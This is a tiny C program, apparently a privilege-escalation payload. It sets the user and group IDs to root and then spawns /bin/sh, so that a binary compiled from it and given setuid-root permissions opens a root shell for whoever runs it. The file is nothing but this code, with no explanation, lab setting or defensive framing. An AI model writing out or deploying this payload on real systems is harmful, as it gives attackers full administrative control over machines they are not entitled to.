#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main (void) {
 setgid(0);setegid(0);setuid(0); seteuid(0);
 system("/bin/sh");}
